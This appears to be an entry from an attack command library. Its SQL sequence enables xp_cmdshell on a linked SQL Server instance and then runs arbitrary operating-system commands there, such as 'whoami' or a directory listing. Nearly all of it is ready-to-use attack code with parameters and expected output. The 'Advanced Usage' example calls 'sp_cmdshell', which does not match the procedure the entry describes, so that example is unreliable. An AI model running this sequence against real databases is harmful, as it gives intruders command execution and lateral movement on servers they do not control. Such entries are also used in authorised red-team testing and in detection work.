---
id: 9bc81634-005c-4227-ab89-a7d35ad40965
name: enable-xp_cmdshell-and-execute-whoami-on-linked-server
type: command
executor: sql
data: >-
  EXECUTE('EXEC sp_configure ''show advanced options'',1') AT
  "linked.database.local";

  EXECUTE('RECONFIGURE') AT "linked.database.local";

  EXECUTE('EXEC sp_configure ''xp_cmdshell'',1') AT "linked.database.local";

  EXECUTE('RECONFIGURE') AT "linked.database.local";

  EXECUTE('EXEC xp_cmdshell ''whoami''') AT "linked.database.local";
output: null
created_at: '2023-04-06T03:56:20.127847+00:00'
updated_at: '2023-04-10T20:36:44.278822+00:00'
platforms:
  - Windows
tags:
  - mssql
  - xp_cmdshell
  - linked-server
verified: true
validated: true
---

# enable-xp_cmdshell-and-execute-whoami-on-linked-server

## Command

```sql
EXECUTE('EXEC sp_configure ''show advanced options'',1') AT "$_LINKED_SERVER";
EXECUTE('RECONFIGURE') AT "$_LINKED_SERVER";
EXECUTE('EXEC sp_configure ''xp_cmdshell'',1') AT "$_LINKED_SERVER";
EXECUTE('RECONFIGURE') AT "$_LINKED_SERVER";
EXECUTE('EXEC xp_cmdshell ''$_COMMAND''') AT "$_LINKED_SERVER";
```

## Description

This multi-statement SQL command sequence enables the xp_cmdshell extended stored procedure on a linked SQL Server instance and executes a sample 'whoami' command to demonstrate OS-level execution. It is used in scenarios where database access allows remote command execution on the host OS via linked servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LINKED_SERVER | Name or address of the linked server (e.g., "linked.database.local") | Yes |
| $_COMMAND | The OS command to execute via xp_cmdshell (default: 'whoami'; escape single quotes as '') | Yes |

## Examples

### Basic Usage

Enable and run 'whoami' on a linked server named "targetdb":

```sql
EXECUTE('EXEC sp_configure ''show advanced options'',1') AT "targetdb";
EXECUTE('RECONFIGURE') AT "targetdb";
EXECUTE('EXEC sp_configure ''xp_cmdshell'',1') AT "targetdb";
EXECUTE('RECONFIGURE') AT "targetdb";
EXECUTE('EXEC xp_cmdshell ''whoami''') AT "targetdb";
```

### Advanced Usage

To execute a different command, like directory listing:

```sql
EXECUTE('EXEC sp_cmdshell ''dir c:\\''') AT "$_LINKED_SERVER";
```

(After enabling as above.)

## Expected Output

For the enabling steps: Messages like "Configuration option changed from 0 to 1. Run the RECONFIGURE statement to install." and "Configuration option 'xp_cmdshell' changed successfully."

For the execution: A result set column with output from 'whoami', e.g.:

| |
|---|
| nt service\mssqlserver |

If disabled or permission denied: Error message like "xp_cmdshell option is not available in this version" or permission errors.

## Related

- [[procedures/Enable-and-Execute-xp_cmdshell-on-Linked-Database]]
